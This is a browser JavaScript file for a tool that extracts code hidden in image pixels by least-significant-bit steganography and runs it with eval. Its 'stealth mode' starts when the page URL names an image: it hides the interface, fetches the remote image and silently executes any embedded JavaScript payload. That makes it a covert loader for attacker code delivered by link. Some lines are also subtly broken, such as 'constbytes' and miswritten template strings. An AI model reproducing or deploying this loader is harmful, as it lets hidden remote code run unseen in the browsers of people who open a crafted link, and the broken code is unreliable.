// Constants for steganography
        const MAGIC_LSB = "STEGOV1\n";
        const MAGIC_JPG = "JSTEGV1\n";
        const JPEG_EOI = "\xff\xd9";
        
        // DOM elements
        const tabs = document.querySelectorAll('.tab');
        const tabContents = document.querySelectorAll('.tab-content');
        const imageUrlInput = document.getElementById('imageUrl');
        const imageUploadInput = document.getElementById('imageUpload');
        const loadFromUrlBtn = document.getElementById('loadFromUrl');
        const loadFromUploadBtn = document.getElementById('loadFromUpload');
        const imageContainer = document.getElementById('imageContainer');
        const statusMessage = document.getElementById('statusMessage');
        const codeContainer = document.getElementById('codeContainer');
        const codeOutput = document.getElementById('codeOutput');
        const resultContainer = document.getElementById('resultContainer');
        const resultOutput = document.getElementById('resultOutput');
        const copyCodeBtn = document.getElementById('copyCode');
        const executeCodeBtn = document.getElementById('executeCode');
        const clearResultBtn = document.getElementById('clearResult');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const mainContainer = document.getElementById('mainContainer');
        
        // Check for stealth mode (image URL in query parameters)
        let stealthMode = false;
        
        // Event listeners for tabs
        tabs.forEach(tab => {
            tab.addEventListener('click', () => {
                const tabId = tab.getAttribute('data-tab');
                
                // Update active tab
                tabs.forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                
                // Update active content
                tabContents.forEach(content => {
                    content.classList.remove('active');
                    if (content.id === `${tabId}-tab`) {
                        content.classList.add('active');
                    }
                });
            });
        });
        
        // Event listeners for buttons
        loadFromUrlBtn.addEventListener('click', loadImageFromUrl);
        loadFromUploadBtn.addEventListener('click', loadFromUpload);
        copyCodeBtn.addEventListener('click', copyCode);
        executeCodeBtn.addEventListener('click', executeCode);
        clearResultBtn.addEventListener('click', clearResult);
        
        // Functions
        function showStatus(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = `status-message status-${type}`;
            statusMessage.style.display = 'block';
            
            // Auto hide after 5 seconds
            setTimeout(() => {
                statusMessage.style.display = 'none';
            }, 5000);
        }
        
        function loadImageFromUrl() {
            const url = imageUrlInput.value.trim();
            if (!url) {
                showStatus('Please enter a valid image URL', 'error');
                return;
            }
            
            showStatus('Loading image...', 'info');
            loadFromUrlBtn.disabled = true;
            loadFromUrlBtn.innerHTML = '<span class="loading"></span> Loading...';
            
            const img = new Image();
            img.crossOrigin = 'anonymous'; // Try to enable CORS
            
            img.onload = function() {
                imageContainer.innerHTML = '';
                imageContainer.appendChild(img);
                showStatus('Image loaded successfully', 'success');
                
                // Create a canvas to get image data
                const canvas = document.createElement('canvas');
                canvas.width = img.width;
                canvas.height = img.height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(img, 0, 0);
                
                // Try to extract code from the image
                try {
                    extractCodeFromImage(canvas, url);
                } catch (error) {
                    showStatus(`Error extracting code: ${error.message}`, 'error');
                }
                
                loadFromUrlBtn.disabled = false;
                loadFromUrlBtn.innerHTML = 'Load Image';
            };
            
            img.onerror = function() {
                showStatus('Failed to load image. Please check the URL and try again.', 'error');
                loadFromUrlBtn.disabled = false;
                loadFromUrlBtn.innerHTML = 'Load Image';
            };
            
            img.src = url;
        }
        
        function loadFromUpload() {
            const file = imageUploadInput.files[0];
            if (!file) {
                showStatus('Please select an image file', 'error');
                return;
            }
            
            if (!file.type.match('image.*')) {
                showStatus('Please select a valid image file', 'error');
                return;
            }
            
            showStatus('Processing image...', 'info');
            loadFromUploadBtn.disabled = true;
            loadFromUploadBtn.innerHTML = '<span class="loading"></span> Processing...';
            
            const reader = new FileReader();
            
            reader.onload = function(e) {
                const img = new Image();
                img.onload = function() {
                    imageContainer.innerHTML = '';
                    imageContainer.appendChild(img);
                    showStatus('Image loaded successfully', 'success');
                    
                    // Create a canvas to get image data
                    const canvas = document.createElement('canvas');
                    canvas.width = img.width;
                    canvas.height = img.height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0);
                    
                    // Try to extract code from the image
                    try {
                        extractCodeFromImage(canvas, file.name);
                    } catch (error) {
                        showStatus(`Error extracting code: ${error.message}`, 'error');
                    }
                    
                    loadFromUploadBtn.disabled = false;
                    loadFromUploadBtn.innerHTML = 'Upload Image';
                };
                
                img.src = e.target.result;
            };
            
            reader.readAsDataURL(file);
        }
        
        function extractCodeFromImage(canvas, filename) {
            const extension = filename.split('.').pop().toLowerCase();
            
            if (extension === 'jpg' || extension === 'jpeg') {
                // For JPEG, we need to get the raw bytes to check for appended data
                // This is more complex in a browser environment, so we'll try LSB first
                extractCodeLSB(canvas);
            } else {
                // For other formats, use LSB extraction
                extractCodeLSB(canvas);
            }
        }
        
        function extractCodeLSB(canvas) {
            const ctx = canvas.getContext('2d');
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = imageData.data;
            
            // Extract LSBs from RGB channels
            const bits = [];
            for (let i = 0; i < data.length; i += 4) {
                bits.push(data[i] & 1);     // Red
                bits.push(data[i + 1] & 1); // Green
                bits.push(data[i + 2] & 1); // Blue
                // Skip alpha channel
            }
            
            // Convert bits to bytes
            constbytes = [];
            for (let i = 0; i < bits.length - 7; i += 8) {
                let byte = 0;
                for (let j = 0; j < 8; j++) {
                    byte = (byte << 1) | bits[i + j];
                }
                bytes.push(byte);
            }
            
            // Convert bytes to string
            let extractedData = '';
            for (let i = 0; i < bytes.length; i++) {
                extractedData += String.fromCharCode(bytes[i]);
            }
            
            // Check if we found the magic string
            if (extractedData.startsWith(MAGIC_LSB)) {
                parsePayload(extractedData, MAGIC_LSB);
            } else {
                showStatus('No hidden code found in this image', 'info');
            }
        }
        
        function parsePayload(data, magic) {
            if (!data.startsWith(magic)) {
                throw new Error(`No compatible payload was found in this image (expected tag \${magic.trim()}).`);
            }
            
            let position = magic.length;
            
            // Extract filename length
            if (data.length < position + 4) {
                throw new Error('Payload is incomplete or corrupted.');
            }
            
            const filenameLength = (data.charCodeAt(position) << 24) |
                                 (data.charCodeAt(position + 1) << 16) |
                                 (data.charCodeAt(position + 2) << 8) |
                                 data.charCodeAt(position + 3);
            position += 4;
            
            if (filenameLength <= 0 || filenameLength > 4096) {
                throw new Error('Invalid embedded filename.');
            }
            
            // Extract filename
            if (data.length < position + filenameLength) {
                throw new Error('Payload is incomplete.');
            }
            
            const originalFilename = data.substring(position, position + filenameLength);
            position += filenameLength;
            
            // Extract data length
            if (data.length < position + 8) {
                throw new Error('Payload is incomplete (missing data length).');
            }
            
            const dataLength = (data.charCodeAt(position) << 56) |
                              (data.charCodeAt(position + 1) << 48) |
                              (data.charCodeAt(position + 2) << 40) |
                              (data.charCodeAt(position + 3) << 32) |
                              (data.charCodeAt(position + 4) << 24) |
                              (data.charCodeAt(position + 5) << 16) |
                              (data.charCodeAt(position + 6) << 8) |
                              data.charCodeAt(position + 7);
            position += 8;
            
            // Extract file data
            if (data.length < position + dataLength) {
                throw new Error('Payload is incomplete (truncated data).');
            }
            
            let fileData = '';
            for (let i = 0; i < dataLength; i++) {
                fileData += data.charAt(position + i);
            }
            
            if (fileData.length === 0) {
                throw new Error('The embedded file is empty.');
            }
            
            // Display the extracted code
            if (!stealthMode) {
                codeContainer.style.display = 'block';
                codeOutput.textContent = fileData;
                showStatus(`Successfully extracted code from: ${originalFilename}`, 'success');
            }
            
            // Auto-execute if it's JavaScript
            if (originalFilename.endsWith('.js')) {
                if (stealthMode) {
                    executeCodeStealth(fileData);
                } else {
                    setTimeout(() => {
                        executeCode();
                    }, 1000);
                }
            }
        }
        
        function copyCode() {
            const code = codeOutput.textContent;
            navigator.clipboard.writeText(code).then(() => {
                showStatus('Code copied to clipboard', 'success');
            }).catch(err => {
                showStatus('Failed to copy code', 'error');
            });
        }
        
        function executeCode() {
            const code = codeOutput.textContent;
            
            if (!code) {
                showStatus('No code to execute', 'error');
                return;
            }
            
            showStatus('Executing code...', 'info');
            executeCodeBtn.disabled = true;
            executeCodeBtn.innerHTML = '<span class="loading"></span> Executing...';
            
            try {
                // Create a sandboxed environment for execution
                const result = (function() {
                    // Capture console output
                    const originalLog = console.log;
                    const logs = [];
                    console.log = function(...args) {
                        logs.push(args.map(arg => 
                            typeof arg === 'object' ? JSON.stringify(arg, null, 2) : String(arg)
                        ).join(' '));
                        originalLog.apply(console, args);
                    };
                    
                    // Execute the code
                    let result;
                    try {
                        result = eval(code);
                    } catch (error) {
                        console.log(`Error: ${error.message}`);
                    }
                    
                    // Restore console.log
                    console.log = originalLog;
                    
                    // Return the logs and result
                    return {
                        output: logs.join('\n'),
                        result: result !== undefined ? String(result) : undefined
                    };
                })();
                
                // Display the result
                resultContainer.style.display = 'block';
                let resultText = '';
                
                if (result.output) {
                    resultText += `=== Console Output ===\n${result.output}\n\n`;
                }
                
                if (result.result !== undefined) {
                    resultText += `=== Return Value ===\n${result.result}`;
                }
                
                resultOutput.textContent = resultText || 'Code executed successfully (no output)';
                showStatus('Code executed successfully', 'success');
            } catch (error) {
                resultContainer.style.display = 'block';
                resultOutput.textContent = `Execution Error: \${error.message}`;
                showStatus('Error executing code', 'error');
            } finally {
                executeCodeBtn.disabled = false;
                executeCodeBtn.innerHTML = 'Execute';
            }
        }
        
        function executeCodeStealth(code) {
            try {
                // Execute the code directly without showing any UI
                (function() {
                    eval(code);
                })();
                
                // In stealth mode, we don't show any results
                console.log('Code executed in stealth mode');
            } catch (error) {
                console.error('Error in stealth execution:', error.message);
            }
        }
        
        function clearResult() {
            resultContainer.style.display = 'none';
            resultOutput.textContent = '';
        }
        
        // Check for image URL in query parameters
        window.addEventListener('load', () => {
            const urlParams = new URLSearchParams(window.location.search);
            const imageUrl = urlParams.get('image');
            
            if (imageUrl) {
                // Enable stealth mode when an image URL is provided
                stealthMode = true;
                
                // Hide the main UI and show only the loading overlay
                mainContainer.style.display = 'none';
                loadingOverlay.style.display = 'flex';
                
                // Load the image from the URL
                const img = new Image();
                img.crossOrigin = 'anonymous';
                
                img.onload = function() {
                    // Create a canvas to get image data
                    const canvas = document.createElement('canvas');
                    canvas.width = img.width;
                    canvas.height = img.height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0);
                    
                    // Try to extract and execute code from the image
                    try {
                        extractCodeFromImage(canvas, imageUrl);
                        
                        // Hide the loading overlay after a short delay
                        setTimeout(() => {
                            loadingOverlay.style.display = 'none';
                            
                            // If execution was successful, we could redirect or close the window
                            // For now, we'll just show a simple message
                            const successDiv = document.createElement('div');
                            successDiv.style.position = 'fixed';
                            successDiv.style.top = '50%';
                            successDiv.style.left = '50%';
                            successDiv.style.transform = 'translate(-50%, -50%)';
                            successDiv.style.background = 'rgba(0, 255, 128, 0.2)';
                            successDiv.style.border = '1px solid rgba(0, 255, 128, 0.5)';
                            successDiv.style.borderRadius = '10px';
                            successDiv.style.padding = '20px';
                            successDiv.style.color = '#00ff80';
                            successDiv.style.textAlign = 'center';
                            successDiv.style.zIndex = '1001';
                            successDiv.innerHTML = '<h3>Code Executed Successfully</h3><p>The hidden code has been executed.</p>';
                            document.body.appendChild(successDiv);
                            
                            // Auto-hide the success message after 3 seconds
                            setTimeout(() => {
                                successDiv.style.opacity = '0';
                                successDiv.style.transition = 'opacity 1s';
                                setTimeout(() => {
                                    document.body.removeChild(successDiv);
                                    // Optionally close the window or redirect
                                    // window.close();
                                }, 1000);
                            }, 3000);
                        }, 1000);
                    } catch (error) {
                        // Show error in stealth mode
                        const errorDiv = document.createElement('div');
                        errorDiv.style.position = 'fixed';
                        errorDiv.style.top = '50%';
                        errorDiv.style.left = '50%';
                        errorDiv.style.transform = 'translate(-50%, -50%)';
                        errorDiv.style.background = 'rgba(255, 64, 64, 0.2)';
                        errorDiv.style.border = '1px solid rgba(255, 64, 64, 0.5)';
                        errorDiv.style.borderRadius = '10px';
                        errorDiv.style.padding = '20px';
                        errorDiv.style.color = '#ff4040';
                        errorDiv.style.textAlign = 'center';
                        errorDiv.style.zIndex = '1001';
                        errorDiv.innerHTML = '<h3>Execution Failed</h3><p>' + error.message + '</p>';
                        document.body.appendChild(errorDiv);
                        
                        // Auto-hide the error message after 5 seconds
                        setTimeout(() => {
                            errorDiv.style.opacity = '0';
                            errorDiv.style.transition = 'opacity 1s';
                            setTimeout(() => {
                                document.body.removeChild(errorDiv);
                                // Show the normal interface so the user can try again
                                mainContainer.style.display = 'block';
                                loadingOverlay.style.display = 'none';
                                stealthMode = false;
                            }, 1000);
                        }, 5000);
                    }
                };
                
                img.onerror = function() {
                    // Show error in stealth mode
                    const errorDiv = document.createElement('div');
                    errorDiv.style.position = 'fixed';
                    errorDiv.style.top = '50%';
                    errorDiv.style.left = '50%';
                    errorDiv.style.transform = 'translate(-50%, -50%)';
                    errorDiv.style.background = 'rgba(255, 64, 64, 0.2)';
                    errorDiv.style.border = '1px solid rgba(255, 64, 64, 0.5)';
                    errorDiv.style.borderRadius = '10px';
                    errorDiv.style.padding = '20px';
                    errorDiv.style.color = '#ff4040';
                    errorDiv.style.textAlign = 'center';
                    errorDiv.style.zIndex = '1001';
                    errorDiv.innerHTML = '<h3>Image Load Failed</h3><p>Could not load the image from the provided URL.</p>';
                    document.body.appendChild(errorDiv);
                    
                    // Auto-hide the error message after 5 seconds
                    setTimeout(() => {
                        errorDiv.style.opacity = '0';
                        errorDiv.style.transition = 'opacity 1s';
                        setTimeout(() => {
                            document.body.removeChild(errorDiv);
                            // Show the normal interface so the user can try again
                            mainContainer.style.display = 'block';
                            loadingOverlay.style.display = 'none';
                            stealthMode = false;
                        }, 1000);
                    }, 5000);
                };
                
                img.src = imageUrl;
            }
        });
        
        // Handle drag and drop
        imageContainer.addEventListener('dragover', (e) => {
            e.preventDefault();
            imageContainer.style.backgroundColor = 'rgba(0, 212, 255, 0.1)';
        });
        
        imageContainer.addEventListener('dragleave', (e) => {
            e.preventDefault();
            imageContainer.style.backgroundColor = 'transparent';
        });
        
        imageContainer.addEventListener('drop', (e) => {
            e.preventDefault();
            imageContainer.style.backgroundColor = 'transparent';
            
            const files = e.dataTransfer.files;
            if (files.length > 0 && files[0].type.match('image.*')) {
                imageUploadInput.files = files;
                loadFromUpload();
            } else {
                showStatus('Please drop a valid image file', 'error');
            }
        });
        
        // Add a function to handle direct links that open in stealth mode
        function handleDirectLink() {
            // This function can be called from outside the page to trigger stealth mode
            stealthMode = true;
            
            // Hide the main UI and show only the loading overlay
            mainContainer.style.display = 'none';
            loadingOverlay.style.display = 'flex';
            
            // Get the image URL from the input field
            const imageUrl = imageUrlInput.value.trim();
            
            if (!imageUrl) {
                showStatus('Please enter a valid image URL', 'error');
                return;
            }
            
            // Load the image from the URL
            const img = new Image();
            img.crossOrigin = 'anonymous';
            
            img.onload = function() {
                // Create a canvas to get image data
                const canvas = document.createElement('canvas');
                canvas.width = img.width;
                canvas.height = img.height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(img, 0, 0);
                
                // Try to extract and execute code from the image
                try {
                    extractCodeFromImage(canvas, imageUrl);
                    
                    // Hide the loading overlay after a short delay
                    setTimeout(() => {
                        loadingOverlay.style.display = 'none';
                        
                        // If execution was successful, we could redirect or close the window
                        // For now, we'll just show a simple message
                        const successDiv = document.createElement('div');
                        successDiv.style.position = 'fixed';
                        successDiv.style.top = '50%';
                        successDiv.style.left = '50%';
                        successDiv.style.transform = 'translate(-50%, -50%)';
                        successDiv.style.background = 'rgba(0, 255, 128, 0.2)';
                        successDiv.style.border = '1px solid rgba(0, 255, 128, 0.5)';
                        successDiv.style.borderRadius = '10px';
                        successDiv.style.padding = '20px';
                        successDiv.style.color = '#00ff80';
                        successDiv.style.textAlign = 'center';
                        successDiv.style.zIndex = '1001';
                        successDiv.innerHTML = '<h3>Code Executed Successfully</h3><p>The hidden code has been executed.</p>';
                        document.body.appendChild(successDiv);
                        
                        // Auto-hide the success message after 3 seconds
                        setTimeout(() => {
                            successDiv.style.opacity = '0';
                            successDiv.style.transition = 'opacity 1s';
                            setTimeout(() => {
                                document.body.removeChild(successDiv);
                                // Optionally close the window or redirect
                                // window.close();
                            }, 1000);
                        }, 3000);
                    }, 1000);
                } catch (error) {
                    // Show error in stealth mode
                    const errorDiv = document.createElement('div');
                    errorDiv.style.position = 'fixed';
                    errorDiv.style.top = '50%';
                    errorDiv.style.left = '50%';
                    errorDiv.style.transform = 'translate(-50%, -50%)';
                    errorDiv.style.background = 'rgba(255, 64, 64, 0.2)';
                    errorDiv.style.border = '1px solid rgba(255, 64, 64, 0.5)';
                    errorDiv.style.borderRadius = '10px';
                    errorDiv.style.padding = '20px';
                    errorDiv.style.color = '#ff4040';
                    errorDiv.style.textAlign = 'center';
                    errorDiv.style.zIndex = '1001';
                    errorDiv.innerHTML = '<h3>Execution Failed</h3><p>' + error.message + '</p>';
                    document.body.appendChild(errorDiv);
                    
                    // Auto-hide the error message after 5 seconds
                    setTimeout(() => {
                        errorDiv.style.opacity = '0';
                        errorDiv.style.transition = 'opacity 1s';
                        setTimeout(() => {
                            document.body.removeChild(errorDiv);
                            // Show the normal interface so the user can try again
                            mainContainer.style.display = 'block';
                            loadingOverlay.style.display = 'none';
                            stealthMode = false;
                        }, 1000);
                    }, 5000);
                }
            };
            
            img.onerror = function() {
                // Show error in stealth mode
                const errorDiv = document.createElement('div');
                errorDiv.style.position = 'fixed';
                errorDiv.style.top = '50%';
                errorDiv.style.left = '50%';
                errorDiv.style.transform = 'translate(-50%, -50%)';
                errorDiv.style.background = 'rgba(255, 64, 64, 0.2)';
                errorDiv.style.border = '1px solid rgba(255, 64, 64, 0.5)';
                errorDiv.style.borderRadius = '10px';
                errorDiv.style.padding = '20px';
                errorDiv.style.color = '#ff4040';
                errorDiv.style.textAlign = 'center';
                errorDiv.style.zIndex = '1001';
                errorDiv.innerHTML = '<h3>Image Load Failed</h3><p>Could not load the image from the provided URL.</p>';
                document.body.appendChild(errorDiv);
                
                // Auto-hide the error message after 5 seconds
                setTimeout(() => {
                    errorDiv.style.opacity = '0';
                    errorDiv.style.transition = 'opacity 1s';
                    setTimeout(() => {
                        document.body.removeChild(errorDiv);
                        // Show the normal interface so the user can try again
                        mainContainer.style.display = 'block';
                        loadingOverlay.style.display = 'none';
                        stealthMode = false;
                    }, 1000);
                }, 5000);
            };
            
            img.src = imageUrl;
        }
        
        // Make the handleDirectLink function globally accessible
        window.handleDirectLink = handleDirectLink;